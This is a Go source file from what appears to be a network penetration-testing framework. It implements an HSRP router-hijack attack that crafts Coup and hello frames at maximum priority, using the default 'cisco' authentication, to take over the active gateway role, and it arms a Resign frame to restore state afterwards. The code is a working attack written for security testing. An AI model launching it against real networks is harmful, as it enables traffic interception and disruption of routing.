// hsrp.go implements the HSRP active-router hijack attack behavior.
//
// Durability (from the catalog): temporary-restored. The attack sends a
// Coup message (opcode=1, priority=255) to steal the active router role,
// then hellos. The teardown arms a Resign message (opcode=2) to restore
// the virtual-router state — matching the baseline's hsrp_cmd which
// sends a resign on Ctrl-C.

package fh

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	nl "go.aledante.io/FlowSeer/src/netpen/layers"
	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type hsrpFinding struct {
	Action   string `json:"action"`
	Opcode   string `json:"opcode"`
	Group    uint8  `json:"group"`
	Priority uint8  `json:"priority"`
	VIP      string `json:"vip"`
	Restore  string `json:"restore"`
}

// RunHSRP sends a Coup to steal the active router role, then arms the
// resign teardown step.
func RunHSRP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	group := uint8(1)
	priority := uint8(255)
	vip := net.IPv4(10, 0, 0, 1)

	// Arm the resign teardown before the first frame (R14).
	resignPkt, err := craftHSRP(src, nl.HSRPOpcodeResign, nl.HSRPStateStandby, priority, group)
	if err != nil {
		return fmt.Errorf("hsrp: craft resign: %w", err)
	}
	deps.Teardown.Arm("hsrp-resign", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, resignPkt)
	})

	// Send the Coup to steal the active role.
	coupPkt, err := craftHSRP(src, nl.HSRPOpcodeCoup, nl.HSRPStateActive, priority, group)
	if err != nil {
		return fmt.Errorf("hsrp: craft coup: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, coupPkt); err != nil {
		return fmt.Errorf("hsrp: send coup: %w", err)
	}

	// Send a hello to maintain the active state.
	helloPkt, err := craftHSRP(src, nl.HSRPOpcodeHello, nl.HSRPStateActive, priority, group)
	if err != nil {
		return fmt.Errorf("hsrp: craft hello: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
		return fmt.Errorf("hsrp: send hello: %w", err)
	}

	detail, _ := json.Marshal(hsrpFinding{
		Action:   "hsrp-coup",
		Opcode:   "coup",
		Group:    group,
		Priority: priority,
		VIP:      vip.String(),
		Restore:  "hsrp-resign",
	})
	deps.Emitter.Finding("hsrp", detail)

	return nil
}

// craftHSRP builds a full HSRP frame: Ethernet → IPv4 → UDP(1985) → HSRP.
func craftHSRP(src net.HardwareAddr, opcode nl.HSRPOpcode, state nl.HSRPState, priority, group uint8) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       hsrpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    net.IPv4(224, 0, 0, 2),
	}
	udp := &layers.UDP{
		SrcPort: 1985,
		DstPort: 1985,
	}
	hsrp := &nl.HSRP{
		Version:   0,
		Opcode:    opcode,
		State:     state,
		Hellotime: 3,
		Holdtime:  10,
		Priority:  priority,
		Group:     group,
		Auth:      [8]byte{'c', 'i', 's', 'c', 'o', 0, 0, 0},
		VirtualIP: net.IPv4(10, 0, 0, 1).To4(),
	}
	return craftUDPLayer(eth, ip, udp, hsrp)
}
